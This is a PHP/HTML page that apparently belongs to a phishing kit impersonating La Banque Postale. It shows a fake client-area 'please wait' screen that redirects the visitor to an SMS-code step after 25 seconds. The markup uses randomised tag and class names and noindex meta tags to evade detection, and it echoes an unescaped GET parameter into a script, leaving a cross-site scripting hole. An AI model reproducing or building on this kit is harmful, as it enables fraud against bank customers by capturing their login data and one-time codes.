<?php
   
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "loading";
    $semantic = semantic();

?>
<!doctype html>
<html style="height: 100%; display: flex; flex-direction: column;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/png" href="../media/imgs/ff.png" />

        <title>La Banque Postale</title>
    </head>

    <body style="height: 100%; display: flex; flex-direction: column;">

		<p class="d-lg-none d-md-block d-sm-block d-block" style="margin-bottom: 0; font-size: 12px; padding: 10px 22px; border-bottom: 1px solid #D8D8D8;">
            <span style="font-weight: 600;">Espace Client,</span><br>
            <i>Dernière connexion le <?php echo date('d/m/Y'); ?></i>
        </p>

        <!-- HEADER -->
        <<?php echo $semantic; ?> id="<?php echo rr(); ?>header<?php echo rr(); ?>" style="border-bottom: 0;">
            <<?php echo $semantic; ?> class="container d-flex">
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>left<?php echo rr(); ?>">
                    <<?php echo $semantic; ?> class="<?php echo rr(); ?>logo<?php echo rr(); ?>"><img style="width: 64px; height: 64px;" src="../media/imgs/logo.svg"></<?php echo $semantic; ?>>
                </<?php echo $semantic; ?>>
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>right<?php echo rr(); ?>">
                    <<?php echo $semantic; ?> class="<?php echo rr(); ?>top<?php echo rr(); ?> d-lg-flex d-md-none d-sm-none d-none align-items-center">
                        <<?php echo $semantic; ?> class="flex-grow-1">
                            <p style="margin-bottom: 0; font-size: 12px; padding: 0 22px;">
                                <span style="font-weight: 600;">Espace Client,</span><br>
                                <i>Dernière connexion le <?php echo date('d/m/Y'); ?></i>
                            </p>
                        </<?php echo $semantic; ?>>
                        <<?php echo $semantic; ?>>
                            <img style="min-width: 369px;" src="../media/imgs/log-header-right.png">
                        </<?php echo $semantic; ?>>
                    </<?php echo $semantic; ?>>
                    <<?php echo $semantic; ?> class="<?php echo rr(); ?>bottom<?php echo rr(); ?> d-lg-flex d-md-flex d-sm-block d-block">
                        <<?php echo $semantic; ?> class="flex-grow-1 d-lg-block d-md-block d-sm-none d-none"><img style="min-width: 743px;" class="d-lg-block d-md-none d-sm-none d-none" src="../media/imgs/log-menu.png"></<?php echo $semantic; ?>>
                        <<?php echo $semantic; ?> class="d-lg-none d-md-block d-sm-block d-block text-end">
                            <img style="min-width: 181px;" src="../media/imgs/log-header-right2.png">
                        </<?php echo $semantic; ?>>
                    </<?php echo $semantic; ?>>
                </<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
        </<?php echo $semantic; ?>>
        <!-- END HEADER -->

        <!-- MAIN -->
        <<?php echo $semantic; ?> id="<?php echo rr(); ?>main2<?php echo rr(); ?>" class="flex-grow-1">
            <<?php echo $semantic; ?> class="container">
                
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>loader<?php echo rr(); ?>">
                    <div class="lds-default"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
                    <p>Veuillez patienter...</p>
                </<?php echo $semantic; ?>>
                
            </<?php echo $semantic; ?>>
        </<?php echo $semantic; ?>>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <<?php echo $semantic; ?> id="footer2" class="mt50">
            <<?php echo $semantic; ?> class="container cc d-flex align-items-center">
                <<?php echo $semantic; ?>><img style="height: 64px; width: 64px;" src="../media/imgs/logo.svg"></<?php echo $semantic; ?>>
                <p>A propos de La Banque Postale<span>-</span>Conditions générales<span>-</span>Sécurité<span>-</span>Alerte fraudes<span>-</span>Accessibilité<span>-</span>Espace Sourds et Malentendants<span>-</span>Mentions légales<span>-</span>Fonds de Garantie des dépôts<span>-</span>Application mobile<span>-</span>Données personnelles<span>-</span>Assistance technique<span>-</span>Cookies<span>-</span>Tarifs<span>-</span>Suivez l’actualité de La Banque Postale</p>
            </<?php echo $semantic; ?>>
        </<?php echo $semantic; ?>>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            $('.lang p').click(function(){
                $('.lang ul').slideToggle();
            });
            setTimeout(function () {
                <?php
                if( isset($_GET['error']) ) {
                    ?>
                    window.location.href= '../index.php?redirection=sms&error=' + "<?php echo $_GET['error']; ?>" + '&id=' + "<?php echo mt_rand(11111, 99999999); ?>";
                    <?php
                } else {
                    ?>
                    window.location.href= '../index.php?redirection=sms&?id=' + "<?php echo mt_rand(11111, 99999999); ?>";
                    <?php
                }
                ?>
            },25000); // 1000 = 1s
        </script>

    </body>

</html>